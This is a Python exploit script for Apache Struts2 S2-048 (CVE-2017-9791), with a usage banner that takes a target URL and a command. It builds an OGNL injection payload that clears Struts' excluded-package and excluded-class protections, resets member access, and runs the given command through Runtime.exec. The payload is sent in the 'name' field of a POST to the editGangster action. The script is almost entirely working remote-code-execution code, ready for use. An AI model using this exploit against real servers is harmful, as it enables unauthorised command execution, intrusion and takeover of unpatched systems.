#!/usr/bin/python
# -*- coding: utf-8 -*-
########################################################################
# 	s2-048																		#
#	Exp for s2-048, CVE-2017-9791.											#
#																				#
#  ______     _______     ____   ___  _ _____     ___ _____ ___  _ 		#
#	 / ___\ \   / / ____|   |___ \ / _ \/ |___  |   / _ \___  / _ \/ |	#
#	| |    \ \ / /|  _| _____ __) | | | | |  / /___| (_) | / / (_) | |	#
#	| |___  \ V / | |__|_____/ __/| |_| | | / /_____\__, |/ / \__, | |	#
# 	\____|  \_/  |_____|   |_____|\___/|_|/_/        /_//_/    /_/|_|	#
#																				#
#	usage:																		#
#	python s2-048.py www.xxx.com/integration/editGangster.action cmd	#
########################################################################


import requests


def exploit(url, cmd):
    print("[+] command: %s" % cmd)

    payload = "%{"
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(@java.lang.Runtime@getRuntime().exec('%s'))" % cmd
    payload += "}"

    data = {
        "name": payload,
        "age": 20,
        "__checkbox_bustedBefore": "true",
        "description": 1
    }

    headers = {
        'Referer': 'http://127.0.0.1:8080/2.3.15.1-showcase/integration/editGangster'
    }
    requests.post(url, data=data, headers=headers)


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("python %s <url> <cmd>" % sys.argv[0])
        sys.exit(0)

    print('[*] exploit Apache Struts2 S2-048')
    url = sys.argv[1]
    cmd = sys.argv[2]

    exploit(url, cmd)

